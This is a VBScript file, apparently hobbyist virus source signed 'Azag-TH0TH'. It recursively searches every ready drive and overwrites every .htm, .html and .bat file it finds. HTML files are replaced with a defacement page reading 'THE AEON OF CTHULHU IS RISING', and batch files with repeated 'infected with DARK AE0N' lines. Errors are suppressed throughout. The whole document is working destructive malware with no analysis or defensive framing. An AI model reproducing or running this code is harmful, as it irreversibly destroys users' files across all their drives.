Dim Fso, Drives, Drive, Folder, Files, File, Subfolders,Subfolder 
Set fso = createobject("scripting.filesystemobject")
Set Drives=fso.drives 
For Each Drive in Drives
If drive.isready then
Dosearch drive
end If 
Next 
function Dosearch(path)
on error resume next
Set Folder=fso.getfolder(path) 
Set Files = folder.files 
For Each File in files
If fso.GetExtensionName(file.path)="htm" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"&lt;html&gt;&lt;head&gt;&lt;title&gt;THE AEON OF CTHULHU IS RISING&lt;/title&gt;&lt;/head&gt;&lt;body&gt;infected by ÐÅRK  Æ0(\)&lt;br&gt;created by -=[Azag-TH0TH]=-&lt;br&gt;&lt;/body&gt;&lt;/html&gt;"
drop.close
end if
If fso.GetExtensionName(file.path)="html" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"&lt;html&gt;&lt;head&gt;&lt;title&gt;THE AEON OF CTHULHU IS RISING&lt;/title&gt;&lt;/head&gt;&lt;body&gt;infected by ÐÅRK  Æ0(\)&lt;br&gt;created by -=[Azag-TH0TH]=-&lt;br&gt;&lt;/body&gt;&lt;/html&gt;"
drop.close
end if
If fso.GetExtensionName(file.path)="bat" then
on error resume next
set drop = fso.createtextfile(File.path)
drop.writeline"@echo on"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.writeline"goto AEON OF CTHULHU IS RISING-------------------infected with DARK AE0N"
drop.close
end if
next
Set Subfolders = folder.SubFolders
For Each Subfolder in Subfolders
Dosearch Subfolder.path 
Next 
end function 
